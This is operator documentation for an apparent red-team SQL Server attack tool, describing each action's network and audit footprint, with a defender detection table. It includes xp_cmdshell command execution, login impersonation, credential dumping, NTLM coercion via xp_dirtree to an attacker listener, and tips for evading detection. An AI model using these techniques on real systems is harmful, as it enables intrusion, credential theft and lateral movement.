# mssqlbof — OPSEC notes

Per-action on-wire and in-memory footprint. Read this before running any of these in an engagement.

Everything ships as a single object file — `mssql.x64.o` (or `.x86.o`) — dispatched by `--action <verb>`. All actions except `find` make a TDS connection from the beacon process to a SQL Server target, so they share the universal footprint below. Per-action details follow after.

## Universal characteristics

**In-process**
- `secur32.dll`, `schannel.dll`, `ws2_32.dll`, `bcrypt.dll`, `crypt32.dll` loaded into beacon. All five are already resident in most beacon hosts.
- **NOT loaded:** `msodbcsql17.dll`, `msodbcsql18.dll`, `sqloledb.dll`, `sqlncli.dll`, `mscoree.dll`, `clr.dll`, `mscorlib.ni.dll`. This is the differentiator — every other BOF that talks to SQL pulls one of these.
- No CLR, no PowerShell engine, no Python interpreter, no Lua VM.
- Single-threaded synchronous protocol over the calling thread's existing stack — no new threads.
- The PTH path (`--auth ntlm --hash`) goes through `bcrypt.dll` HMAC-MD5 only. SSPI is never called when `--hash` is set.

**On-wire**
- TCP to the target SQL port (default 1433).
- TDS 7.4 PRELOGIN exchange (~50 bytes each direction).
- TLS 1.2 handshake wrapped inside TDS PRELOGIN packets (~2 KB each direction, ~5 round trips). Real Schannel, not a stub.
- LOGIN7 encrypted as TLS application data (~200–600 bytes plaintext depending on auth mode).
- LOGIN response comes back plaintext (SQL Server's login-only asymmetric TLS quirk).
- SSPI/NTLM multi-leg responses are plaintext both ways. The BOF handles this automatically — if you encrypt the continuation, SQL Server closes the socket.
- Then plaintext TDS for all post-login queries/responses.

**Server-side**
- SQL audit event 33205 (`AUDIT_LOGIN`) if the `Logon` audit specification is on. Default off on most installs.
- Client process name on the beacon host is whatever process the beacon is injected into — `notepad.exe`, `svchost.exe`, whatever. Telemetry that filters on "known SQL clients" (`sqlcmd.exe`, `ssms.exe`, `dotnet.exe`) will not match.
- Ephemeral source port, like any other TCP connection.
- The BOF sends `app_name = mssqlbof` in LOGIN7. If a defender is watching `sys.dm_exec_sessions.program_name`, that string is a static IOC — swap it in `src/tds/login7.c` `append_wide(pkt, &pos, L"mssqlbof", ...)` if you care.

The single noisiest universal tell is the last point on the server side: SQL audit plus EDR network telemetry will see "process X on host Y connected to SQL Server", and X may not match the org's known SQL clients. If the org uses application allow-listing for SQL traffic this will flag. There is no clean fix at the BOF level — it is a beacon-host tradeoff.

## Per-action details

### `find`

**On-wire:** one LDAP search to a Domain Controller on TCP/389 with filter `(servicePrincipalName=MSSQLSvc/*)`. No TDS connection.

**In-process:** loads `wldap32.dll` (usually already loaded by anything that touches AD).

**Server-side (DC):** LDAP query auditing event 1644 if enabled. The filter shape is unusual enough to be a soft IOC, but `setspn -Q` produces the same query for legitimate admin use.

**Detection:** low. Safest action in the suite.

### `info`

**On-wire:** one TDS connection plus a single fixed introspection batch covering version, edition, current user, sysadmin membership, current DB, and `@@VERSION`.

**Server-side:** login audit 33205 if enabled. The query shape is identical to what management tools run on first connect, so on the query trace it's hard to distinguish.

**Detection:** low.

### `query`

**On-wire:** one TDS connection plus whatever T-SQL you pass through `--sql`.

**Server-side:**
- Statement appears in `sys.dm_exec_query_stats`.
- Heavy queries show up in `sys.dm_exec_sessions` and Activity Monitor.
- Default trace captures nothing unusual.

**Detection:** depends entirely on what you query. `SELECT @@version` is invisible. `SELECT * FROM HR.Employees` is a career-limiting move.

### `links`

**On-wire:** one TDS connection plus a `sys.servers` query. Single-hop only in the current release. Recursive walker is v0.2.

**Server-side:** one `sys.servers` SELECT visible to the default trace.

**Detection:** low.

### `exec`

**The loud one.** Documented loudly so operators do not deploy this without thinking.

**On-wire:** TDS connection, `sp_configure`/`RECONFIGURE` to enable `xp_cmdshell`, `EXEC xp_cmdshell '<cmd>'`, and by default a second `sp_configure` to restore the original state.

**Server-side:**
- `sp_configure` calls are logged in the default trace, which is on by default in every SQL Server install. `xp_cmdshell` enable/disable events are visible to anyone running `sp_readtraces`.
- The `xp_cmdshell` invocation itself spawns `sqlservr.exe → cmd.exe → <your command>`. Every EDR catches this process tree.
- Auto-restore doubles the trace footprint but leaves the box clean for the next admin who looks.
- `--no-restore` halves the noise but leaves `xp_cmdshell` enabled — visible to any later `SELECT * FROM sys.configurations` from a defender.

**Privesc path:** if the authenticating login is not sysadmin, `exec` auto-dispatches through the privesc machinery (`--impersonate auto` by default) and tries `EXECUTE AS LOGIN` via an IMPERSONATE grant, then a TRUSTWORTHY hop if that fails. Both leave distinct audit trails — see the `impersonate` section.

**Detection:** HIGH. Quieter CLR-assembly and SQL-Agent-job exec paths are v0.2.

**Operator advice:** if you only need recon, use `query`. If you need code exec, wait for the v0.2 CLR method, or pair `exec` with `coerce` to push the auth out of the SQL service account entirely.

### `impersonate`

**On-wire:** TDS connection plus `EXECUTE AS LOGIN = '<login>'; <user-sql>; REVERT;`

**Server-side:**
- `EXECUTE AS` generates audit event 33205 (`AUDIT_LOGIN`) under the impersonated login.
- `REVERT` generates audit event 33206.
- If audit is off, both are invisible.
- `--discover` runs a `sys.server_permissions` SELECT visible to the default trace.

**Detection:** low if audit is off, medium if on. The "discover then impersonate sa" sequence is a known privesc IOC pattern.

### `privesc`

**On-wire:** one TDS connection plus six introspection queries against `sys.server_principals`, `sys.server_permissions`, `sys.databases`, `sys.servers`, `fn_my_permissions(NULL,'SERVER')`, and `sys.configurations`.

**Server-side:** six small SELECTs visible to the default trace. No state change.

**Detection:** low. The query shape looks like a security assessment tool — that is what this is.

### `coerce`

**On-wire:** TDS connection plus `EXEC master..xp_dirtree '\\<listener>\x', 1, 1`. The SQL service account then attempts an SMB auth to your listener.

**Server-side:** `xp_dirtree` call visible to the default trace. The SQL service account is the one that authenticates outbound — point this at a responder/ntlmrelayx listener.

**Detection:** medium. `xp_dirtree` to an external UNC is unusual and on well-tuned defender dashboards shows up as a "SMB coercion" alert. The win is that the NetNTLMv2 you capture belongs to the SQL service account, which is often a privileged domain account.

### `passwords`

**On-wire:** TDS connection plus two SELECTs: `sys.linked_logins` joined to `sys.servers`, and `sys.credentials`.

**Server-side:** two SELECTs in default trace. Requires VIEW SERVER STATE or sysadmin for the full dump.

**Detection:** low. No state change, no exec. Pairs well with `privesc`.

### `chain`

**On-wire:** TDS connection plus `EXEC ('<your-sql>') AT [<link>]`. Pass-through execution on a linked server with the linked-login mapping.

**Server-side:** the linked server sees a session under the configured remote credentials. Your direct target sees the `EXEC AT` call in default trace.

**Detection:** medium — linked-server pass-through is unusual application traffic and defenders tuned for pivot activity will notice. It is the quietest way to reach a second SQL Server via the first, though, because no new network session opens from the beacon host to the second server.

## Defender perspective

If you are on the defensive side and reading this, here is what catches each action:

| Detection | What it catches |
|---|---|
| LDAP query audit `(servicePrincipalName=MSSQLSvc/*)` from non-admin hosts | `find` |
| SQL audit `AUDIT_LOGIN` from process names outside `{sqlcmd, ssms, dotnet, ...}` | every other action |
| Default trace `sp_configure xp_cmdshell` events outside change-window | `exec` |
| Process tree `sqlservr.exe → cmd.exe` | `exec` (the loudest signal) |
| SQL audit `EXECUTE AS LOGIN` events outside known service-account flows | `impersonate`, `exec --impersonate login` |
| `xp_dirtree` with a UNC path pointing outside the enterprise SMB namespace | `coerce` |
| `EXEC ... AT [linked_server]` from a non-application session | `chain` |
| `app_name = mssqlbof` on any active session | any action (easy fix — rebuild with a different app_name) |

The hard one for defenders is that none of these actions leave a Windows-process-loaded-DLL signature like the .NET or ODBC tools do. There is no `msodbcsql.dll` to alert on. The signal moves entirely to the SQL server side.
